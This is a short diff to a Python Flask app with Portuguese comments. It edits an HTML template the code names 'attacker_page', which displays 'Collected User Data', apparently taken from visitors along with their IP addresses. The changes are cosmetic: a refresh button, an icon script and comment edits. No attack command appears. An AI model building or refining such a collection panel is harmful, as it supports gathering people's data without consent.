@@ -18,11 +18,9 @@ data_store = []
 
 # Função de validação de IP
 def is_valid_ip(ip):
-    # Regex para verificar um IPv4 válido
     return re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip) is not None
 
 def get_client_ip():
-    # Tenta obter o IP real do cliente usando X-Forwarded-For
     if request.headers.get('X-Forwarded-For'):
         ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
     else:
@@ -88,10 +86,17 @@ attacker_page = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Collected Data</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.1.2/dist/tailwind.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/js/all.min.js"></script>
 </head>
 <body class="bg-gray-100 flex items-center justify-center h-screen">
     <div class="bg-white p-8 rounded shadow-lg w-2/3">
-        <h1 class="text-2xl font-bold mb-4 text-center">Collected User Data</h1>
+        <div class="flex justify-between items-center mb-4">
+            <h1 class="text-2xl font-bold">Collected User Data</h1>
+            <!-- Botão de refresh com ícone -->
+            <button onclick="fetchData()" class="text-blue-500 hover:text-blue-700">
+                <i class="fas fa-sync-alt fa-lg"></i>
+            </button>
+        </div>
         <div id="data-container" class="text-left"></div>
     </div>
 
@@ -111,6 +116,7 @@ attacker_page = """
             `).join('');
         }
         
+        // Chama fetchData() para carregar os dados ao abrir a página
         fetchData();
     </script>
 </body>
